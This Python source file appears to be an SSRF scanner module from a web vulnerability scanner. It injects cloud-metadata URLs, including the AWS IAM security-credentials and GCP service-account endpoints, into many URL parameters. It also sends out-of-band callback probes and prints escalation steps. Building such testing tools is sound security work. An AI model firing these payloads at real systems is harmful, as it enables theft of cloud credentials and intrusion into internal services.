"""
SSRFScanner — Server-Side Request Forgery detection with OOB confirmation.

Lifecycle:
  DETECTED:   Cloud metadata signature matched (1-2 sigs, low confidence)
  VALIDATED:  Strong metadata response (2+ sigs, JSON body, credentials)
  EXPLOITABLE: (not applicable — SSRF is inherently exploitable)
  VERIFIED:   OOB callback received

Maturity: Level 4 (OOB-confirmed)
"""

import hashlib
from urllib.parse import urlparse, urlencode, parse_qs

from models.finding import Finding
from models.evidence import (
    HttpRequestEvidence,
    ResponseExcerptEvidence,
)
from modules.utils import (
    finding, log, Colors, _build_curl, safe_get,
    VerificationStage,
    safe_cookies_dict,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "file", "document", "page", "redirect",
    "dest", "target", "next", "proxy", "endpoint", "link",
    "image", "img", "src", "load", "fetch", "read", "include",
    "host", "domain", "reference", "callback", "webhook",
]

SSRF_SIGNATURES = [
    "ami-id", "ami-launch-index", "ami-manifest-path", "block-device-mapping",
    "hostname", "iam", "instance-action", "instance-id", "instance-type",
    "local-hostname", "local-ipv4", "mac", "metrics", "network",
    "placement", "product-codes", "public-hostname", "public-ipv4",
    "public-keys", "reservation-id", "security-groups",
    "meta-data", "user-data", "ec2_", "iam_role",
]

DEFAULT_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://100.100.100.200/latest/meta-data/",
]


class SSRFScanner(ScannerBase):
    SCANNER_NAME = "ssrf"
    SCANNER_MATURITY = 4

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)

    # ── Detection phase ─────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
        parsed = urlparse(url)
        original_params = parse_qs(parsed.query)
        params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))

        baseline_resp = safe_get(self.session, url, self.timeout)
        baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None

        for param in params:
            for payload in DEFAULT_SSRF_PAYLOADS:
                test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text
                matched = [sig for sig in SSRF_SIGNATURES if sig in body]
                if matched and len(matched) >= 2:
                    json_detected = body.strip().startswith("{")
                    credentials_found = any(kw in body.lower() for kw in ("secret", "token", "password"))
                    return DetectionResult(
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        context=f"ssrf_metadata:{','.join(matched)}",
                        raw_response=resp,
                        evidence_signals=matched + (["json"] if json_detected else []) + (["credentials"] if credentials_found else []),
                    )
        return None

    def validate(self, detection: DetectionResult) -> ValidationResult | None:
        from scanners.base import ValidationResult
        sigs = getattr(detection, "evidence_signals", []) or []
        json_detected = "json" in sigs
        credentials_found = "credentials" in sigs
        metadata_sigs = [s for s in sigs if s not in ("json", "credentials")]
        score = 0
        if len(metadata_sigs) >= 3:
            score += 40
        elif len(metadata_sigs) >= 2:
            score += 30
        elif metadata_sigs:
            score += 20
        if json_detected:
            score += 15
        if credentials_found:
            score += 20
        if score >= 55:
            return ValidationResult(confirmed=True, signals=metadata_sigs, method="metadata_strong", detail=f"SSRF confidence score {score}")
        if score >= 30:
            return ValidationResult(confirmed=True, signals=metadata_sigs, method="metadata_weak", detail=f"SSRF confidence score {score}")
        return ValidationResult(confirmed=False, signals=metadata_sigs, method="metadata_weak", detail="Low confidence SSRF")

    def collect_evidence(self, detection: DetectionResult,
                         validation_result: ValidationResult | None = None) -> list:
        from models.evidence import HttpRequestEvidence, ResponseExcerptEvidence
        ev_list = []
        resp = detection.raw_response
        if resp:
            req_ev = HttpRequestEvidence(
                method="GET",
                url=detection.url,
                headers=dict(self.session.headers),
                curl_command=_build_curl("GET", detection.url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                description=f"SSRF probe to cloud metadata endpoint via {detection.url}",
            )
            resp_ev = ResponseExcerptEvidence(
                excerpt=resp.text[:500],
                length=len(resp.text),
                context="ssrf_metadata",
                description=f"Cloud metadata response ({len(resp.text)} chars)",
            )
            ev_list.extend([req_ev, resp_ev])
        return ev_list

    def generate_reproduction(self, detection: DetectionResult,
                              validation_result: ValidationResult | None = None) -> list[str]:
        sigs = getattr(detection, "evidence_signals", []) or []
        metadata_sigs = [s for s in sigs if s not in ("json", "credentials")]
        return [
            f"Prerequisite: no special tooling required. Use curl or a browser.",
            f"Send GET request to {detection.url} — the vulnerable parameter is: {detection.parameter}",
            f"Observe cloud metadata signature in response: {', '.join(metadata_sigs[:3])}",
            "This confirms the server fetches URLs from user-controllable parameters and returns the response",
            "Escalate: attempt OOB callback confirmation using --oob-host for verified SSRF status",
        ]

    def _calculate_ssrf_confidence(self, signatures: list[str], baseline_diff: bool,
                                    json_detected: bool, credentials_found: bool) -> int:
        score = 0
        if len(signatures) >= 3:
            score += 40
        elif len(signatures) >= 2:
            score += 30
        elif signatures:
            score += 20
        if baseline_diff:
            score += 15
        if json_detected:
            score += 15
        if credentials_found:
            score += 20
        return min(100, score)

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        oob_host = self.config.get("oob_host")
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                original_params = parse_qs(parsed.query)
                params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))

                baseline_resp = safe_get(self.session, url, self.timeout)
                baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None

                vulnerable_params: list[str] = []
                all_matched_sigs: set[str] = set()
                json_detected = False
                credentials_found = False
                matching_resp = None

                for param in params:
                    for payload in DEFAULT_SSRF_PAYLOADS:
                        test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
                        resp = safe_get(self.session, test_url, self.timeout)
                        if not resp:
                            continue
                        body = resp.text
                        matched = [sig for sig in SSRF_SIGNATURES if sig in body]
                        if matched and len(matched) >= 2:
                            if matching_resp is None:
                                matching_resp = resp
                            vulnerable_params.append(param)
                            all_matched_sigs.update(matched)
                            if body.strip().startswith("{"):
                                json_detected = True
                            if any(kw in body.lower() for kw in ("secret", "token", "password")):
                                credentials_found = True
                            break

                    if oob_host and self.validation:
                        oob_payload_url = f"http://{self.validation.callback_host}/ssrf"
                        oob_probe_url = self._build_ssrf_url(url, parsed, original_params, param, oob_payload_url)
                        safe_get(self.session, oob_probe_url, self.timeout, raise_for_status=False)
                        self.validation.register_oob("ssrf", oob_payload_url, oob_probe_url)

                if vulnerable_params and matching_resp is not None:
                    resp_hash = hashlib.md5(matching_resp.text.encode()).hexdigest()
                    baseline_diff = baseline_hash is not None and resp_hash != baseline_hash
                    confidence_score = self._calculate_ssrf_confidence(
                        list(all_matched_sigs), baseline_diff, json_detected, credentials_found,
                    )
                    if confidence_score < 40:
                        log(f"  [SSRF] Skipped {url} (confidence {confidence_score}% < 40%)",
                            Colors.WHITE, verbose_only=True, verbose=self.verbose)
                        continue

                    detection = DetectionResult(
                        url=url,
                        parameter=", ".join(vulnerable_params[:5]),
                        payload="metadata",
                        context=f"ssrf_metadata:{','.join(all_matched_sigs)}",
                        raw_response=matching_resp,
                        evidence_signals=list(all_matched_sigs) + (["json"] if json_detected else []) + (["credentials"] if credentials_found else []),
                    )
                    validation_result = self.validate(detection)
                    evidence_list = self.collect_evidence(detection, validation_result)

                    for ev in evidence_list:
                        self.evidence_engine.store(ev)

                    parsed_for_fp = urlparse(url)
                    ssrf_url = f"{parsed_for_fp.scheme}://{parsed_for_fp.netloc}"

                    f = finding(
                        vuln_type="Confirmed SSRF",
                        url=ssrf_url,
                        severity="critical",
                        details=(
                            f"Vulnerable parameters ({len(vulnerable_params)}): "
                            f"{', '.join(vulnerable_params[:10])} — triggered at: {url}"
                        ),
                        evidence=f"Signatures: {', '.join(list(all_matched_sigs)[:5])}",
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=matching_resp.text[:500],
                        steps_to_reproduce=self.generate_reproduction(detection, validation_result),
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=[f"Cloud metadata signature matched: {s}" for s in all_matched_sigs],
                        confidence_score=confidence_score,
                    )
                    if f and self._add_finding(f):
                        fingerprint = f.get("fingerprint", "")
                        if fingerprint and self.evidence_engine is not None:
                            for ev in evidence_list:
                                self.evidence_engine.link_to_finding(ev, fingerprint)

            except Exception as e:
                log(f"  [SSRF] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        if self.validation:
            oob_evidence_list = self.validation.poll_oob()
            for oob_ev in oob_evidence_list:
                original_url = getattr(oob_ev, "_original_url", self.base_url)
                callback_raw = oob_ev.raw_data or ""
                if self.evidence_engine is not None:
                    self.evidence_engine.store(oob_ev)
                f = finding(
                    vuln_type="Confirmed SSRF (OOB)",
                    url=original_url,
                    severity="critical",
                    details="OOB callback received for SSRF probe — DNS/HTTP interaction confirmed from target server",
                    evidence=f"Callback: {callback_raw[:200]}",
                    request=_build_curl("GET", original_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                    verification_stage=VerificationStage.VERIFIED.value,
                    validation_steps=["OOB callback verified: DNS/HTTP interaction confirmed from target infrastructure"],
                    response_excerpt="(SSRF confirmed via out-of-band callback — DNS/HTTP request received from target server)",
                    steps_to_reproduce=[
                        f"Prerequisite: an OOB callback host configured via --oob-host (Interactsh, Burp Collaborator, or custom DNS/HTTP listener)",
                        f"Send SSRF probe to {original_url} with an OOB payload (DNS/HTTP to attacker-controlled host)",
                        f"Observe OOB callback from target server IP — confirms the server makes external requests from user-controllable input",
                        f"Escalate: use SSRF to access internal metadata endpoints (169.254.169.254) or internal services",
                    ],
                )
                if f and self._add_finding(f):
                    fingerprint = f.get("fingerprint", "")
                    if fingerprint and self.evidence_engine is not None:
                        self.evidence_engine.link_to_finding(oob_ev, fingerprint)

        return self._get_findings()

    def _build_ssrf_url(self, url: str, parsed, original_params: dict, param: str, payload: str) -> str:
        if param in original_params:
            return self._inject_param(url, param, payload)
        separator = "&" if parsed.query else "?"
        return f"{url}{separator}{urlencode({param: payload})}"

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        from urllib.parse import urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
